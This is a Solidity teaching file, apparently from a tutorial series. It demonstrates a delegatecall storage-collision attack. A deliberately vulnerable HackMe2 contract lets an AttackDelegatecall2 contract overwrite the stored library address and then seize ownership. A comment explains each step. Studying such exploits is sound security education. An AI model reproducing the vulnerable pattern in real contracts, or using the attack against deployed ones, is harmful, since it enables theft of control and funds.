// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

/*
This is a more sophisticated version o f the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variable are not defined int he same manner in Lib and HackMe
This means that calling Lib.doSomething() wiil change the first state variable inside
HackMe, which happens to be the address of Lib.

Inside attack(), the first call to doSomething() changes the address of Lib store in HackMe.
Address of Lib is now set ot Attack.
The second call to doSomething() calls Attack.doSomething() and here we change the 
owner.
*/

contract Lib2 {
    uint256 public someNumber;
    function doSomething(uint256 _num) public {
        someNumber = _num;
    }
}

contract HackMe2 {
    address public lib;
    address public owner;
    uint256 public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract AttackDelegatecall2 {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint256 public someNumber;

    HackMe2 public hackMe;

    constructor(HackMe2 _hackMe) {
        hackMe = HackMe2(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint256(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}